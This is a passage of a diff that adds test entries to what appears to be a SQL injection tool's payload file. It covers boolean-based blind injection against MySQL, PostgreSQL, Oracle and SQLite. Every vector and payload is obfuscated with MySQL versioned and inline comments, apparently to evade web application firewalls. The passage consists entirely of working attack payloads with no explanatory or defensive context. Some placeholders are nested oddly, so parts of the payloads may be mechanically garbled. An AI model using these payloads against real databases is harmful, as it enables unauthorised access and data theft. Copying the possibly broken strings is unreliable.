+            <payload>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE(/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE(/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,8</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE(/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE(/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE(/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,8</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST('/*!50000[RANDSTR]/**_**/*/'/**_**/*/ /*!50000AS/**_**/*/ /*!50000NUMERIC)/**_**/*/ /*!50000END))/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST('/*!50000[RANDSTR]/**_**/*/'/**_**/*/ /*!50000AS/**_**/*/ /*!50000NUMERIC)/**_**/*/ /*!50000END))/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST('/*!50000[RANDSTR]/**_**/*/'/**_**/*/ /*!50000AS/**_**/*/ /*!50000NUMERIC)/**_**/*/ /*!50000END))/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST('/*!50000[RANDSTR]/**_**/*/'/**_**/*/ /*!50000AS/**_**/*/ /*!50000NUMERIC)/**_**/*/ /*!50000END))/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST('/*!50000[RANDSTR]/**_**/*/'/**_**/*/ /*!50000AS/**_**/*/ /*!50000NUMERIC)/**_**/*/ /*!50000END))/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST('/*!50000[RANDSTR]/**_**/*/'/**_**/*/ /*!50000AS/**_**/*/ /*!50000NUMERIC)/**_**/*/ /*!50000END))/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS.DRITHSX.SN(1,/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS.DRITHSX.SN(1,/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS.DRITHSX.SN(1,/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS.DRITHSX.SN(1,/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS.DRITHSX.SN(1,/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS.DRITHSX.SN(1,/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON('/*!50000[RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON('/*!50000[RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON('/*!50000[RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON('/*!50000[RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON('/*!50000[RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON('/*!50000[RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <!-- End of boolean-based blind tests - WHERE or HAVING clause -->
+
+    <!-- Boolean-based blind tests - Parameter replace -->
+    <test>
+        <title>Boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>/*!50000MAKE_SET(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>/*!50000MAKE_SET(/*!50000[INFERENCE]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL boolean-based blind - Parameter replace (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>/*!50000ELT(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL boolean-based blind - Parameter replace (ELT - original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>/*!50000ELT(/*!50000[INFERENCE]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL boolean-based blind - Parameter replace (bool*int)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000[/*!50000INFERENCE]/**_**/*/)*/*!50000[RANDNUM]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>(/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)*/*!50000[RANDNUM1]/**_**/*//**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)*/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL boolean-based blind - Parameter replace (bool*int - original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000[/*!50000INFERENCE]/**_**/*/)*/*!50000[ORIGVALUE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>(/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)*/*!50000[ORIGVALUE]/**_**/*//**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)*/*!50000[ORIGVALUE]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
+    <test>
+        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
+    <test>
+        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
